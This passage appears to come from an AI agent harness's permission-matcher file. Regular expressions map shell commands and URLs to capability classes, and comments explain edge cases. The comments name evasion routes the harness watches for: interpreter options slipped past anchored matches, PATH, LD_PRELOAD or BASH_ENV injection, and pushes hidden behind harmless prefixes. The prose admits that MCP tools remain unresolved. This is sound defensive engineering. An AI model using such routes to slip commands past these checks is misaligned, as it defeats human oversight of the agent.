    command: '^(set|shift|unset|readonly|local|declare|typeset|true|false|:|jobs|wait|hash|type|umask|ulimit|pwd|dirs|cd|pushd|popd|for|while|until|case|esac|done|fi|then|else|elif|do|continue|break|return|shopt|enable|caller|times|suspend)\b[^<>|`]*(?:\s*(?:\d?>>?\s*/dev/null|\d?>&[0-9-]|&>>?\s*/dev/null|<\s*(?![~/])(?!\S*\.\.)[\w.@/-]+))*\s*$'
  - capability: command.read-only
    tool: Bash
    command: '^(?:(?:ls|cat|head|tail|less|more|wc|grep|rg|egrep|fgrep|tree|pwd|echo|printf|which|type|date|whoami|id|uname|df|du|stat|file|diff|uniq|cut|jq|yq|history|dirname|basename|sleep|seq|nproc|realpath|readlink|mktemp|tr|cmp|comm|expr|exit|test|read|gsed|gawk|shellcheck|printenv|sha1sum|sha256sum|shasum|md5sum|cksum|tput|hostname|getconf|locale|column|paste|join|fold|rev|nl|tac|numfmt|timeout\s+\d)\b|\[\s|find\b|fd\b|sort\b|awk(?!.*-i)\b|sed(?!\s+(?:-i|--in-place))\b|xargs\s+(?:ls|cat|grep|rg|wc)\b|node\s+(?:-v|--version)\b|node\s+-e\s+["'']?console\.log\((?:"[^"()]*"|''[^''()]*''|[0-9.]*)\)["'']?\s*$|npm\s+(?:ls|view|--version|-v|outdated|why|explain)\b|python3?\s+(?:--version|-V)\b|python3?\s+-c\s+["'']?print\((?:"[^"()]*"|''[^''()]*''|[0-9.]*)\)["'']?\s*$|tsc\s+--version\b|git\s+(--version|version)\b|env(?:\s+(?:-[iu0]\S*|[A-Za-z_][A-Za-z0-9_]*=\S*))*\s*$)'
  # A LINE THAT ONLY BINDS A NAME RUNS NOTHING. `TODAY=$(date +%F)`, `n=$((i+1))` and `export FOO=bar` reached
  # command.unknown and asked, and once a script body is split line by line that is most of a real script
  # (exit review 4). The substituted command is a segment of its own and is classified there; an assignment to a
  # name that redefines EXECUTION — PATH, LD_PRELOAD, BASH_ENV, GIT_* — is surfaced as an `env-inject` marker by
  # the normalizer and matched by its own rule above, which is why this one can stay narrow rather than clever.
  - capability: command.read-only
    tool: Bash
    command: '^(?:(?:export|declare|local|readonly|typeset)\s+)?(?:[A-Za-z_][A-Za-z0-9_]*(?:\+)?=(?:\$ARITH|\$SUBST|\$\{[A-Za-z_][A-Za-z0-9_]*(?:[:#%/^,][^{}]*)?\}|\$[A-Za-z_][A-Za-z0-9_]*|"[^"`]*"|''[^'']*''|[^\s;&|`$<>]*)\s*)+$'
  # A call to a function DEFINED IN THE SAME UNIT runs a body the analyzer already read at the definition, so the
  # call adds no closure of its own. The marker is put on the head by the analyzer, which is the only place that
  # knows which names the unit defined; the rest of the segment — its redirections and path operands — is still
  # matched normally after it (exit review 5).
  - capability: command.read-only
    tool: Bash
    command: '^\x00ego\x00local-function\b'
  # `command -v NAME` and `command -V NAME` LOOK UP a program, they do not run it. `command` is stripped as a
  # transparent wrapper, so `command -v node` was classified as RUNNING node and asked — in the one idiom every
  # script uses to test whether a tool exists (exit review 4).
  - capability: command.read-only
    tool: Bash
    command: '^command\s+-[vV]\s+\S+(?:\s+(?:\d?>>?\s*/dev/null|\d?>&[0-9-]|&>>?\s*/dev/null))*\s*$'
  # interposed interpreter options (`python3 -u -c`, `node --no-warnings -e`) must not escape the ^-anchored match
  - capability: command.interpreter-inline
    tool: Bash
    command: '^(?:(?:node|nodejs|deno|bun|tsx|ts-node)\s+(?:-[-\w=.]+\s+)*(?:-e|--eval|-p|--print|-r|--require|-[A-Za-z]*[er])|(?:python3?|ruby|perl|php|Rscript)\s+(?:-[-\w=.]+\s+)*(?:-c|-e|-r|-E|-[A-Za-z]*[cerE]))'
  - capability: command.interpreter-script
    tool: Bash
    command: '^(node|python3?|tsx|ts-node|bun|deno\s+run|ruby|perl|php)\s+(?!-)[^\s]+\.(js|mjs|cjs|ts|mts|py|rb|pl|php)\b'
  # `tee` copies standard input to standard output and writes the files it names; those files are classified as
  # write destinations on their own, so the stage itself is the ordinary build idiom `cmd | tee build.log`
  - capability: command.local-mutation
    tool: Bash
    command: '^tee\b'
  - capability: command.local-mutation
    tool: Bash
    command: '^(npm\s+(install|i|ci|uninstall|update|run\s+(format:fix|lint:fix|generate|codegen))|npx\s+(prettier|eslint)\b.*(--write|--fix)|pnpm\s+(install|add|remove)|yarn\s+(add|remove|install)|pip\s+install|poetry\s+(install|add)|go\s+(mod|get)|cargo\s+(add|update)|(mkdir|touch|cp|mv|ln|tar|zip|unzip)\b|chmod\s+[0-7+])'
  # Any remaining interpreter invocation runs a program the kernel has not read. It is opaque, not a local
  # mutation: `node dist/index`, `node .`, `python3 -m pkg`, `deno task x` (challenge finding 3).
  - capability: command.interpreter-script
    tool: Bash
    command: '^(node|nodejs|deno|bun|tsx|ts-node|python|python2|python3|ruby|perl|php|Rscript|osascript)\b'
  # --- network classes (WebFetch / MCP url tools) ---
  - capability: network.localhost
    tool: WebFetch
    url: '^(localhost|127\.0\.0\.1|\[::1\]|0\.0\.0\.0)(:\d+)?$'
  - capability: network.public-read
    tool: WebFetch
    url: '.*'
---
# Operation to capability matchers

The machine part of this file is the frontmatter. Matchers translate what a host reports (a shell command, a file
path, a URL, an MCP tool name) into a capability identifier that the compiled authority table can decide. The order is
the priority: locked-deny matchers (absolute and organization-locked) come first so a compound command cannot hide a push behind a harmless prefix.

Consumers may add matchers in `.harness/overlay/matchers.md`; they may only map to existing capabilities that are
ASK or DENY in the effective table (narrowing), never introduce an ALLOW mapping for a command the core classifies
as unknown or stricter.

MCP tools (`mcp__<server>__<tool>`) are not listed here. **Today every one of them resolves to `mcp.unknown`**:
`ego init` writes `.harness/mcp-trust.md` into the consumer repository, but nothing parses it yet, so no
`mcp.local.*` or `mcp.remote.*` capability is ever reached. The resolution is phase-2 work (issue #10), and the
failure is in the safe direction — an unresolved MCP tool is treated as unknown, never as trusted. This paragraph
previously described the resolver as if it existed (challenge finding 10).
